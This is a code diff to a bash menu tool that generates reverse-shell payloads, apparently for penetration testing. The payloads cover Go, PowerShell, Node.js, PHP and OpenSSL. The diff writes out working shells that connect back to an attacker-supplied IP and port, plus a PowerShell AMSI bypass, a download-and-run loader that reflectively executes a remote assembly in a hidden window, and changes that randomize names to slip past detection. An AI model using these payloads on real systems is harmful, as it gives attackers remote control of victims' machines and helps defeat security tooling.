@@ -561,7 +561,7 @@ then
     PORT=$ngrokPORT
 fi
 header
-rev="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$IP:$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
+rev="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$IP:$PORT\");cmd:=exec.Command(\"$nshell\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
 
 if [[ $1 == "url" ]] 
 then
@@ -747,6 +747,9 @@ fi
 
 ### reflective
 function powershell_reflective () {
+
+placeh=$(openssl rand -hex $(shuf -i 1-11 -n1))
+
 header
 if [ $usingngrok == 1 ]
 then 
@@ -765,7 +768,7 @@ fi
                 echo "This shell needs a full AMSI bypass to run."
                 read -p "Please enter url for AMSI bypass [$amsiurl]: " aurl
                 aurl=${aurl:-$amsiurl}
-                fAMSIb="IEX (New-Object System.Net.Webclient).DownloadString('$aurl');"
+                fAMSIb="IEX (New-Object System.\$$placeh"Net.Webclient").DownloadString('$aurl');"
         
             else
                 
@@ -791,7 +794,7 @@ pwsh=$(shuf -er -n21  {A..Z} {a..z} | tr -d '\n')
 
 AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
 
-rev="$AMSIb\$$bytes = (curl $url -UseBasicParsing ).Content;\$$assembly = [Reflection.Assembly]::Load(\$$bytes);\$$entryPointMethod = @(\$$assembly.GetTypes().GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic') ) -ne \$null;\$$entryPointMethod.Invoke(\$null, (, [string[]] ('$IP', '$PORT')))"
+rev="$AMSIb\$$bytes = (curl $url -UseBasicParsing ).Content;\$$assembly = [Reflection.Assembly]::Load(\$$bytes);\$$entryPointMethod = @(\$$assembly.GetTypes().GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic') ) -ne \$$placeh;\$$entryPointMethod.Invoke(\$$placeh, (, [string[]] ('$IP', '$PORT')))"
 rev=$(echo -n $rev| iconv --to-code UTF-16LE | $benc --base64 -w0)
 rev="cmd /c \"set ${pwsh}=powershell & set ${space}=\" \" & call %${pwsh}%%${space}%-W%${space}%Hidden%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${rev}\""
 
@@ -915,7 +918,7 @@ then
     PORT=$ngrokPORT
 fi
 header
-rev="require('child_process').exec('rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh')"
+rev="require('child_process').exec('rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | $nshell >/tmp/meh 2>&1; rm /tmp/meh')"
 
 if [[ $1 == "url" ]] 
 then
@@ -967,7 +970,7 @@ fi
 header
 #echo "Generating certificate..."
 openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 365 -nodes -subj "/C=US/ST=*/L=*/O=*/CN=shells.com"
-rev="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s"
+rev="mkfifo /tmp/s; $nshell -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s"
 
 if [[ $1 == "url" ]] 
 then
@@ -1612,7 +1615,7 @@ else
     exec=$2
 fi
 
-rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);\$c=\"bash <&3 >&3 2>&3\";$exec("\$c");'"
+rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);\$c=\"$nshell <&3 >&3 2>&3\";$exec("\$c");'"
 
 if [[ $1 == "url" ]] 
 then
@@ -1747,7 +1750,7 @@ Choose an option:  "
         oshell="bash"
         read -p "Please enter shell [$oshell]: " nshell
         nshell=${nshell:-$oshell}
-        submenu_netcat
+        submenu_ruby
         ;;
 
     m)
@@ -1766,6 +1769,10 @@ Choose an option:  "
 
 
 submenu_nodejs() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/bash"
+fi
 header
     echo -ne "
 $(blueprint 'node.js')
@@ -1775,7 +1782,9 @@ $(greenprint '3)') URL encoded
 $(greenprint '4)') Double URL encoded
 $(greenprint '5)') XSS variant 1
 $(greenprint '6)') XSS variant 2
-$(greenprint '7)') Deserialize
+$(greenprint '7)') Deserialize\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -1802,6 +1811,13 @@ Choose an option:  "
         ;;
     7)
         node "deserial"
+        ;;
+    s)
+        echo ""
+        oshell="/bin/bash"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_nodejs
         ;;
     m)
         mainmenu
@@ -2128,13 +2144,19 @@ Choose an option:  "
 }
 
 submenu_go_lang() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/sh"
+fi
 header
     echo -ne "
 $(blueprint 'Golang')
 $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
-$(greenprint '4)') Double URL encoded
+$(greenprint '4)') Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2153,6 +2175,13 @@ Choose an option:  "
     4)
         go_lang "urlx2"
         ;;
+    s)
+        echo ""
+        oshell="/bin/sh"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_go_lang
+        ;;
     m)
         mainmenu
         ;;
@@ -2167,6 +2196,10 @@ Choose an option:  "
 }
 
 submenu_php() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/bash"
+fi
 header
     echo -ne "
 $(blueprint 'PHP')
@@ -2177,7 +2210,9 @@ $(greenprint '4)') exec Double URL encoded
 $(greenprint '5)') system No encoding
 $(greenprint '6)') system Base64 encoded
 $(greenprint '7)') system URL encoded
-$(greenprint '8)') system Double URL encoded
+$(greenprint '8)') system Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2207,6 +2242,13 @@ Choose an option:  "
         ;;
     8)
         php "urlx2" "system"
+        ;;
+    s)
+        echo ""
+        oshell="/bin/bash"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_php
         ;;
     m)
         mainmenu
@@ -2423,6 +2465,7 @@ Choose an option:  "
 }
 
 submenu_awk() {
+
 header
     echo -ne "
 $(blueprint 'awk')
@@ -2448,6 +2491,7 @@ Choose an option:  "
     4)
         awk_s "urlx2"
         ;;
+
     m)
         mainmenu
         ;;
@@ -2462,13 +2506,19 @@ Choose an option:  "
 }
 
 submenu_open_s() {
+if [ "$nshell" == "" ]
+then
+    nshell="/bin/bash"
+fi
 header
     echo -ne "
 $(blueprint 'OpenSSL')
 $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
-$(greenprint '4)') Double URL encoded
+$(greenprint '4)') Double URL encoded\n\n
+$(cyanprint "OPTIONS")
+$(greenprint 's)') Which shell [$nshell]
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
@@ -2486,6 +2536,13 @@ Choose an option:  "
         ;;
     4)
         open_s "urlx2"
+        ;;
+    s)
+        echo ""
+        oshell="/bin/bash"
+        read -p "Please enter shell [$oshell]: " nshell
+        nshell=${nshell:-$oshell}
+        submenu_open_s
         ;;
     m)
         mainmenu
